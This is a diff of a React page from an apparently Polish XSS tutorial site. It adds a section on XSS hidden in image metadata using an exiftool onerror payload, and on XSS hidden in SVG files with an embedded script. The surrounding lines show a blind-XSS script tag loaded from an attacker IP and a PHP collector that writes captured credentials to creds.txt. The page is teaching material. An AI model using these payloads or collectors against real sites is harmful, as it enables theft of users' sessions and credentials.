@@ -1,6 +1,8 @@
 import './xss.scss';
 import { Link } from 'react-router-dom';
 import blind_xss_example from '../../../assets/blind_xss_example.png';
+import xss_in_file from '../../../assets/xss_in_file.png';
+import xss_in_file_xml from '../../../assets/xss_in_file_xml.png';
 import ExampleFrame from '../../exampleFrame/ExampleFrame';
 
 const XSS = () => {
@@ -71,7 +73,7 @@ const XSS = () => {
             </div>
 
             <h4>Przykład z zastosowaniem PHP</h4>
-            <div className='example_code'>
+            <div className='example_code waring'>
                 <p>{`<?php`}</p>
                 <p className='tab-1'>{`if (isset($_GET['username']) && isset($_GET['password'])) {`}</p>
                 <p className='tab-2'>{`$file = fopen("creds.txt", "a+");`}</p>
@@ -100,7 +102,7 @@ const XSS = () => {
             <p>Wysyłamy {`<script src=http://OUR_IP/script.js></script>`}</p>
 
             <p>Tworzymy plik index.php</p>
-            <div className='example_code'>
+            <div className='example_code waring'>
                 <p>{`<?php`}</p>
                 <p className='tab-1'>{`if (isset($_GET['c'])) {`}</p>
                 <p className='tab-2'>{`$list = explode(";", $_GET['c']);`}</p>
@@ -117,6 +119,31 @@ const XSS = () => {
             <h4 className='important'>Rezultat:</h4>
             <ExampleFrame screen={blind_xss_example}/>
 
+            <hr />
+
+            <h2>XSS zaszyte w plikach</h2>
+            <p>Innym przykładem ataków XSS są aplikacje internetowe, które wyświetlają metadane obrazu po jego przesłaniu. W przypadku takich aplikacji internetowych możemy dołączyć ładunek XSS do jednego z parametrów metadanych, które akceptują nieprzetworzony tekst, np. parametrów <span className='important'>Komentarza lub Artysty</span>, w następujący sposób:</p>
+            <div className='waring'>
+                <p className='important'><span className='important'>{`exiftool -Comment=' "><img src=1 onerror=alert(window.origin)>' HTB.jpg`}</span></p>
+                <p className='important'><span className='important'>{`exiftool HTB.jpg`}</span></p>
+                <p>Comment: <span className='tab-3'>{`"><img src=1 onerror=alert(window.origin)>`}</span></p>
+            </div>
+
+            <ExampleFrame screen={xss_in_file} />
+            <p>Widzimy, że parametr <span className='important'>Komentarz</span> został zaktualizowany do naszego ładunku XSS. Po wyświetleniu metadanych obrazu powinien zostać uruchomiony ładunek XSS i wykonany zostanie kod JavaScript w celu przeprowadzenia ataku XSS. Co więcej, jeśli zmienimy typ MIME obrazu na <span className='important'>text/html</span>, niektóre aplikacje internetowe mogą wyświetlić go jako dokument HTML zamiast obrazu, w którym to przypadku ładunek XSS zostanie uruchomiony, nawet jeśli metadane nie zostaną wyświetlone bezpośrednio.</p>
+            
+            <h3>Zaszywanie w XML/ SVG</h3>
+            <p>Wreszcie ataki XSS można również przeprowadzać z obrazami <span className='important'>SVG</span>, a także kilkoma innymi atakami. Obrazy Scalable Vector Graphics (SVG) są oparte na formacie XML i opisują grafikę wektorową 2D, która przeglądarka renderuje w obraz. Z tego powodu możemy modyfikować ich dane XML, aby uwzględnić ładunek XSS. Na przykład możemy zapisać w <span className='important'>HTB.svg</span> następujący tekst:</p>
+            <div className='waring'>
+                <p>{`<?xml version="1.0" encoding="UTF-8"?>`}</p>
+                <p>{`<!DOCTYPE svg PUBLIC "-//W3C//DTD SVG 1.1//EN" "http://www.w3.org/Graphics/SVG/1.1/DTD/svg11.dtd">`}</p>
+                <p>{`<svg xmlns="http://www.w3.org/2000/svg" version="1.1" width="1" height="1">`}</p>
+                <p className='tab-1'>{`<rect x="1" y="1" width="1" height="1" fill="green" stroke="black" />`}</p>
+                <p className='tab-1'><span className='important'>{`<script type="text/javascript">alert(window.origin);</script>`}</span></p>
+                <p>{`</svg>`}</p>
+            </div>
+            <ExampleFrame screen={xss_in_file_xml} />
+            
             <hr />
 
             <h2 className='defense'>Zapobieganie XSS</h2>
